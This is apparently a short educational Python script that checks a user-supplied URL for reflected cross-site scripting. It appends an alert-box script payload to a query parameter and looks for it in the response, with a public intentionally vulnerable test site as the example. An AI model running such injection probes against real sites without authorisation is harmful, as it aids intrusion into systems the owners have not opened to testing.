import requests

def check_xss(url):
    print(f"\n[+] Testing {url} for Reflected XSS...")
    
    # The payload we want to inject
    # We use a harmless script that just pops up an alert box
    payload = "<script>alert('XSS')</script>"
    
    # Construct the malicious URL
    # We assume the URL ends with a parameter like ?q=
    target_url = f"{url}{payload}"
    print(f"  > Injecting payload: {payload}")
    
    try:
        # Send the request
        response = requests.get(target_url)
        
        # ANALYSIS:
        # If the website is vulnerable, it will include our <script> tag 
        # inside the HTML it sends back to us.
        if payload in response.text:
            print(f"\n[!!!] XSS VULNERABILITY FOUND!")
            print(f"      The server reflected the payload: {payload}")
            print(f"      Target: {target_url}")
        else:
            print("\n[-] The payload was not reflected. Likely safe.")
            
    except Exception as e:
        print(f"  [!] Connection Error: {e}")

if __name__ == "__main__":
    # Test URL - This is a real vulnerable search page
    print("Tip: Use a URL with a parameter, like a search page.")
    target = input("Enter URL (e.g., http://testphp.vulnweb.com/listproducts.php?cat=): ")
    check_xss(target)